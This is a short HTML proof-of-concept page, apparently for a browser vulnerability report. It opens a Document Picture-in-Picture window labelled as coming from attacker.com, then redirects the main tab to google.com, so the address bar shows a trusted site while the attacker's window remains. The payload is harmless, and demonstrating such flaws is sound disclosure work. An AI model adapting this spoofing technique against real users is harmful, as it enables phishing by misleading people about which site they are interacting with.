<!DOCTYPE html>
<html>
<body>
<h3>PoC S3 - 1 Tab Redirect</h3>
<button id="open">1. Open PiP</button>
<button id="go">2. Go to google.com (same tab)</button>

<script>
let pipWin = null;
document.getElementById('open').onclick = async () => {
  pipWin = await documentPictureInPicture.requestWindow({width: 350, height: 200});
  pipWin.document.body.innerHTML = `
    <style>body{font-family:sans-serif;text-align:center}</style>
    <h3>This PiP is from attacker.com</h3>
    <p>Main bar will be google.com</p>
    <button id="btn" onclick="this.textContent='Clicked! From attacker.com but bar=google.com'; this.style.background='red'">Click Me</button>
  `;
};

document.getElementById('go').onclick = () => {
  // INI KUNCINYA: redirect tab yang sama, bukan window.open
  window.location.href = 'https://www.google.com';
};
</script>
</body>
</html>
